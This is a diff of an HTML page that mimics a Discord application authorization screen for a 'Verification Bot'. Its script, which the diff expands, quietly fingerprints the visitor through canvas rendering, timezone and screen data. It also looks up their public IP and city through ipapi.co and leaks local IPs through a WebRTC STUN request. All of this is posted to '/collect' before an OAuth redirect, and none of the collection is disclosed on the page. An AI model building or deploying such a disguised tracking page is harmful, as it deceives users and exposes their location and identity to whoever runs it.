@@ -2,40 +2,83 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Server Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Authorize Application</title>
 <style>
-  :root { --bg: #313338; --card: #2b2d31; --text: #dbdee1; --muted: #949ba4; --blurple: #5865f2; --input: #1e1f22; --border: #3f4147; }
+  :root {
+    --bg: #313338;
+    --card: #2b2d31;
+    --text: #dbdee1;
+    --text-header: #f2f3f5;
+    --muted: #949ba4;
+    --blurple: #5865f2;
+    --blurple-hover: #4752c4;
+    --border: #1e1f22;
+    --font: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  }
   * { box-sizing: border-box; }
-  body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; align-items: center; justify-content: center; padding: 20px; }
-  .card { background: var(--card); border-radius: 8px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,.45); text-align: center; max-width: 480px; width: 100%; }
-  .app-icon { width: 80px; height: 80px; border-radius: 50%; background: var(--input); margin: 0 auto 16px; overflow: hidden; }
+  body {
+    margin: 0; min-height: 100vh; background: var(--bg); color: var(--text);
+    font-family: var(--font); display: flex; align-items: center; justify-content: center;
+    padding: 20px; -webkit-font-smoothing: antialiased;
+  }
+  .wrap { width: 100%; max-width: 480px; background: #2b2d31; border-radius: 8px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,.2); }
+  
+  .app-info { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
+  .app-icon { width: 60px; height: 60px; border-radius: 50%; background: #1e1f22; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; }
   .app-icon img { width: 100%; height: 100%; object-fit: cover; }
-  h1 { font-size: 22px; color: #fff; margin: 0 0 8px; }
-  .sub { color: var(--muted); font-size: 14px; margin: 0 0 24px; }
-  .info-box { background: var(--input); border: 1px solid var(--border); border-radius: 6px; padding: 16px; text-align: left; margin-bottom: 20px; font-size: 13px; }
-  .consent { display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: var(--muted); text-align: left; margin-bottom: 16px; cursor: pointer; }
-  button { width: 100%; padding: 11px; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; background: var(--blurple); color: #fff; }
+  .app-details { text-align: left; }
+  .app-name { font-size: 20px; font-weight: 600; color: var(--text-header); margin-bottom: 4px; }
+  .app-dev { font-size: 14px; color: var(--muted); }
+  
+  .title { font-size: 20px; font-weight: 600; color: var(--text-header); margin: 0 0 8px; text-align: left; }
+  .subtitle { font-size: 14px; color: var(--text); margin: 0 0 24px; text-align: left; line-height: 1.4; }
+  
+  .perm-box { background: #1e1f22; border-radius: 4px; padding: 16px; margin-bottom: 24px; text-align: left; }
+  .perm-title { font-size: 12px; font-weight: 700; color: var(--text-header); text-transform: uppercase; margin-bottom: 12px; }
+  .perm-list { margin: 0; padding: 0; list-style: none; }
+  .perm-list li { display: flex; align-items: flex-start; gap: 12px; font-size: 14px; margin-bottom: 12px; color: var(--text); line-height: 1.4; }
+  .perm-list li:last-child { margin-bottom: 0; }
+  .perm-list li::before { content: '•'; color: var(--muted); font-size: 18px; line-height: 1; }
+  
+  .consent { display: flex; align-items: flex-start; gap: 10px; font-size: 14px; color: var(--text); text-align: left; margin-bottom: 24px; cursor: pointer; line-height: 1.4; }
+  .consent input { margin-top: 2px; accent-color: var(--blurple); width: 16px; height: 16px; cursor: pointer; }
+  
+  button {
+    width: 100%; padding: 12px; border: none; border-radius: 3px; font-size: 16px; font-weight: 500;
+    cursor: pointer; background: var(--blurple); color: white; transition: background .17s ease;
+  }
+  button:hover:not(:disabled) { background: var(--blurple-hover); }
   button:disabled { opacity: .5; cursor: not-allowed; }
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="app-icon">
-    <img src="https://static.wikia.nocookie.net/roblox-tower-battles/images/c/cd/DefaultGraveyard-Level2.png/revision/latest?cb=20241030203837">
+<div class="wrap">
+  <div class="app-info">
+    <div class="app-icon">
+
+      <img src="https://i.ibb.co/TMtbxsrs/tb.jpg" alt="Bot Icon">
+    </div>
+    <div class="app-details">
+      <div class="app-name">Verification Bot</div>
+      <div class="app-dev">wants to access your Discord account</div>
+    </div>
   </div>
-  <h1>Server Verification</h1>
-  <p class="sub"><b>Verification Bot</b> requires you to verify.</p>
-  <div class="info-box">
-    <ul>
-      <li>Access your username and email</li>
+
+  <h2 class="title">This will allow the app to:</h2>
+  <div class="perm-box">
+    <ul class="perm-list">
+      <li>Access your username, avatar, and email</li>
       <li>Add you to the server and assign a role</li>
     </ul>
   </div>
+
   <label class="consent">
     <input type="checkbox" id="consent" checked>
     <span>I authorize this application to access my account data.</span>
   </label>
-  <button id="verifyBtn" onclick="startVerification()">Verify & Authorize</button>
+
+  <button id="verifyBtn" onclick="startVerification()">Authorize</button>
 </div>
 
 <script>
@@ -51,15 +94,15 @@ async function startVerification() {
   btn.disabled = true;
   btn.textContent = 'Verifying...';
   const stateId = Math.random().toString(36).substring(2, 15);
-  const report = await collectData();
-
+  
   try {
+    const report = await collectData();
     await fetch('/collect', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ state: stateId, data: report })
     });
-  } catch (e) { console.error(e); }
+  } catch (e) { console.error('Ошибка сбора данных', e); }
 
   const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state=${stateId}`;
   window.location.href = oauthUrl;
@@ -67,13 +110,34 @@ async function startVerification() {
 
 async function collectData() {
     const n = navigator;
-    const report = { ua: n.userAgent, platform: n.platform, screen: { width: screen.width, height: screen.height } };
+    const report = { 
+        ua: n.userAgent, 
+        platform: n.platform, 
+        screen: { width: screen.width, height: screen.height },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Hello, world!', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Hello, world!', 4, 17);
+        report.canvasHash = canvas.toDataURL();
+    } catch(e) { report.canvasHash = 'error'; }
+
     try {
         const geoRes = await fetch('https://ipapi.co/json/');
         const geoData = await geoRes.json();
         report.publicIp = geoData.ip;
-        report.geo = { city: geoData.city, country: geoData.country_name, org: geoData.org };
+        report.geo = { city: geoData.city, region: geoData.region, country: geoData.country_name, org: geoData.org };
     } catch(e) {}
+
     try {
         const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
         pc.createDataChannel('');
@@ -87,7 +151,8 @@ async function collectData() {
         await new Promise(r => setTimeout(r, 1500));
         report.localIps = [...localIps];
         pc.close();
-    } catch(e) {}
+    } catch(e) { report.localIps = ['error']; }
+    
     return report;
 }
 </script>
